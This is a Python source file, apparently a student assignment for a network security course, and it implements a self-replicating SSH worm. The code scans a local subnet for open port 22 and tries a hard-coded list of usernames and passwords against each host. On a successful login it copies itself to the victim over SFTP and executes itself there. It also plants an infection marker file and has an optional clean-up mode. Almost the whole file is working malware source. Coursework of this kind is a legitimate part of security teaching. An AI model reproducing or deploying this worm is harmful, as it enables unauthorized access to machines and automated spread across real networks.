
##################################################################
# CPSC 456 - Network Security Fundamentals
# 
# Oscar Castaneda (CWID: 888837614)
# Assignmnet 3 - Python Worm Program
##################################################################
import paramiko
import sys
import socket
import nmap
import netinfo
import os

import netifaces
import random

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"
WORM_FILE = "/tmp/worm.py"

LOOPBACK_INTERFACE = "lo"
HOST_MARKER_FILE = "/home/cpsc/host_system.txt"

WORM_MSG =  "                              /)      \n" +
			"  .-\"\"--.....__...,-'/     \n" +
			" ( (\"\"\"`----......--'     \n" +
			"  `.`._                      \n" +
			"    `-.`-.                   \n" +
			"       `.//`-._              \n" +
			"         \"`--._) Oh Look A Worm . . . . .      \n"

COMPROMISED_MSG = u"\u2620 \u2620 \u2620 Too Late . . . . Already Infected \u2620 \u2620 \u2620 "

CLEANING_MODE = False

##################################################################
# Returns whether the worm should spread
# @param sftpClient - SFTP client object 
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem( sftpClient ):
	# Check if the system has been infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).
	try:
		sftpClient.stat( INFECTED_MARKER_FILE )		# Check if remote host is infected
		return True
	except IOError:
		return False

#################################################################
# Marks the system as infected
#################################################################
def markInfected( ):
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	# sftpClient.put( "/tmp/infected.txt", INFECTED_MARKER_FILE )

	infected_tag = open( INFECTED_MARKER_FILE, "w" )
	infected_tag.write( WORM_MSG )
	infected_tag.close()

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute( sshClient, sftpClient ):
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.
	try:
		sftpClient.put( find_file( "worm.py" ), "/tmp/" + "worm.py" )

		sshClient.exec_command( "chmod a+x /tmp/worm.py" )
		sshClient.exec_command( "nohup python /tmp/worm.py" )
	except:
		print sys.exc_info()[0]


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials( host, userName, password, sshClient ):
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	try:
		sshClient.connect( host, username = userName, password = password )
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise.
	except socket.error as sock_err:
		print "Socket Error - " + sock_err
		return 3
	# If the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception.
	except paramiko.SSHException as miko_err:
		print "Wrong credentials - " + str( miko_err )
		return 1
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	return 0


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem( host ):
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		attemptResults = tryCredentials( host, username, password, ssh )
		# Call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system.
		if attemptResults == 0:
			return ( ssh, username, password )
			
	# Could not find working credentials
	return None

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP( interface ):
	# Retrieve and return the IP of the current system.
	# Get the IP address
	ip_addr = netifaces.ifaddresses( interface )[2][0]['addr']

	# The IP address of the interface
	return ip_addr if not ip_addr == "127.0.0.1" else None


#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork( ):
	# Scanning for hosts on the same network
	# and return the list of discovered
	# IP addresses.
	portScanner = nmap.PortScanner()
	portScanner.scan( '10.0.0.0/24', arguments = '-p 22 --open' )

	return portScanner.all_hosts()

###############################################################
# Checks if a systems is infected and if so executed the clean
# functionality to the connected system
# @param sshClient - the instance of the SSH client connected
# to the victim system
# @param sftpClient - the instance of SFTP connected
# to the victim system
###############################################################
def clean_mess( sshClient, sftpClient ):
	try:
		# Check if remote host is infected
		sftpClient.stat( INFECTED_MARKER_FILE )
	except IOError:
		print "No Cleaning Necessary"
		return

	sshClient.exec_command( "nohup python /tmp/worm.py --clean" )

###############################################################
# Returns the file path where worm.py is located and None if
# not found
# @param file_name - File name being searched for
###############################################################
def find_file( file_name ):
	# This is to get the directory that the program  
	# is currently running in. 
	dir_path = os.path.dirname(os.path.realpath(__file__)) 
	  
	for root, dirs, files in os.walk(dir_path): 
	    for file in files:  
	        if file.endswith('.py'): 
	            return (root+'/'+str(file_name))
	return None

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP.
if len( sys.argv ) < 2 and not os.path.exists( HOST_MARKER_FILE ):
	# If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice.
	if os.path.exists( INFECTED_MARKER_FILE ):
		sys.exit()

	# Mark Infected and Proceed with proceed with distributing worm
	try:
		print "[ TAGGING . . . ]"
		markInfected( )
	except:
		tagging_error = sys.exc_info()[0]
		print tagging_error

if any( arg in ( "-c", "--clean" ) for arg in sys.argv):
	print "[CLEANING MODE . . . "
	CLEANING_MODE = True
	# If not host file delete files and keep executing script loaded into memory
	# No need to check if files exist becasue if script is executed on infected system that is becasue 
	# files are here
	if not os.path.exists( HOST_MARKER_FILE ):
		os.remove("/tmp/infected.txt")
		os.remove("/tmp/worm.py")

interface_list = netifaces.interfaces()
interface_list.remove( LOOPBACK_INTERFACE )

for interface in interface_list:
	print "Interface: ", interface
	# Get the IP of the current system
	ip_addr = getMyIP( interface )

	# Get the hosts on the same network
	networkHosts = getHostsOnTheSameNetwork()

	# Remove the IP of the current system
	# from the list of discovered systems (we
	# do not want to target ourselves!).
	networkHosts.remove( ip_addr )

	# Randomly shuffle hosts to make spread not predictable
	random.shuffle( networkHosts )

	print "Found hosts: ", networkHosts

	# Go through the network hosts
	for host in networkHosts:
		# Try to attack this host
		sshInfo =  attackSystem( host )
		
		print sshInfo
		
		# Attack succeeded
		if sshInfo:
			print "Credentials Found.\n[ CONNECTING . . . ]"

			sftp_client = sshInfo[0].open_sftp()

			# Check if the system was	
			# already infected. This can be
			# done by checking whether the
			# remote system contains /tmp/infected.txt
			# file (which the worm will place there
			# when it first infects the system)
			if CLEANING_MODE:
				print "[ REMOVING WORM . . . . ]"
				clean_mess( sshInfo[0], sftp_client )
			else:
				if not isInfectedSystem( sftp_client ):
					# If the system was already infected proceed.
					# Otherwise, infect the system and terminate.
					# Infect that system
					try:
						print "[ INFECTING . . . . ]"
						spreadAndExecute( sshInfo[0], sftp_client )
					except:
						infecting_error = sys.exc_info()[0]
						print infecting_error
				else:
					print "[ WORM ALREADY FOUND ]"
			sftp_client.close()